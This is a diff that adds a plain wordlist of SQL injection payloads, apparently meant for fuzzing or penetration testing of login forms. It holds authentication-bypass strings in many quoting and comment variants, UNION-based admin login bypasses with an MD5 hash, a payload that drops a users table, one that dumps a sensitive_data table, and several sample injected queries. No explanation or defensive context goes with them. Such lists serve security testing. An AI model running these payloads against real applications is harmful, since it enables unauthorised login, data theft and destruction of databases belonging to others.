@@ -1,0 +1,102 @@
+' OR '1'='1' --
+' OR '1'='1'; --
+' OR '1'='1' #
+' OR '1'='1'; #
+' OR '1'='1' /*
+' OR '1'='1'; /*
+' OR '1'='1'--
+' OR '1'='1';--
+' OR '1'='1'#
+"' OR '1'='1';#
+' OR '1'='1'/*
+' OR '1'='1';/*
+'
+' OR '1'='1
+" OR "1"="1
+') OR ('1'='1
+") OR ("1"="1
+') OR username IS NOT NULL; --
+') OR password IS NOT NULL; --
+') OR 1=1; DROP TABLE users; --
+') OR 1=1; SELECT * FROM sensitive_data; --
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin "81dc9bdb52d04dc20036dbd8313ed055
+"==
+SELECT * FROM Users WHERE email = '' OR TRUE -- AND password = 698d51a19d8a121ce581499d7b701668' AND deletedAt IS NULL
+SELECT * FROM Users WHERE email = ''' AND password = '698d51a19d8a121ce581499d7b701668' AND deletedAt IS NULL
+SELECT * FROM users WHERE email = '' or 1=1;-- ' AND pass=dummy'
